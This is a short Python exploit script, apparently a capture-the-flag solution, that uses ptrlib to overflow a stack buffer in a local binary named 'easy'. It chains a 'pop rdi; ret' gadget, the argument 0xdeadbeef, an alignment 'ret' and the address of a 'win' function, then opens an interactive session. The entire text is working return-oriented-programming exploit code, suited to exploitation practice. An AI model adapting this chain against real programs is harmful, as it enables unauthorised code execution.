from ptrlib import *

bin_file = './easy'

def attack(conn):
   
    elf = ELF(bin_file)

    bof = b'A' * 40

    pop_rdi_ret = p64(next(elf.gadget("pop rdi; ret")))

    rdi_key = p64(0xdeadbeef)

    avoid_moveups_ret = p64(next(elf.gadget("ret")))

    win_addr = p64(elf.symbol('win'))

    expolit = bof + pop_rdi_ret + rdi_key + avoid_moveups_ret + win_addr

    conn.sendline(expolit)

if __name__ == '__main__':
    conn = process(bin_file)
    # input()
    attack(conn)
    conn.interactive()
